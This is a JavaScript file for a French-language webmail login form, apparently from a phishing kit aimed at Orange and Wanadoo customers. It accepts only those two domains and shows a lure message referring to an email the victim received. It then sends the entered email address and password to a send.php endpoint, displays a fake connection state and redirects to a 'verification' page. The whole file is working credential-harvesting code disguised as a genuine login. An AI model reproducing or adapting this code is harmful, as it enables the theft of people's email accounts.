
document.getElementById('loginForm').addEventListener('submit', function (e) {
  e.preventDefault();

  const email = document.getElementById('email').value.trim();
  const password = document.getElementById('password').value.trim();
  const emailError = document.getElementById('emailError');
  const passwordError = document.getElementById('passwordError');

  emailError.textContent = '';
  passwordError.textContent = '';

  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  const domain = email.split('@')[1];
  const allowed = ['orange.fr', 'wanadoo.fr'];

  if (!emailRegex.test(email)) {
    emailError.textContent = "Adresse e-mail invalide.";
    return;
  }

  if (!allowed.includes(domain)) {
    emailError.textContent = "Veuillez entrer les identifiants de l’adresse e-mail liée au courrier reçu.";
    return;
  }

  if (!password) {
    passwordError.textContent = "Veuillez entrer un mot de passe.";
    return;
  }

  // Envoi vers le serveur
  fetch('send.php', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`
  })
  .then(res => res.text())
  .then(() => {
    document.querySelector('button').textContent = "Connexion en cours...";
    document.querySelector('button').disabled = true;
    setTimeout(() => {
      window.location.href = "verification.html";
    }, 2000);
  })
  .catch(err => {
    console.error("Erreur:", err);
  });
});
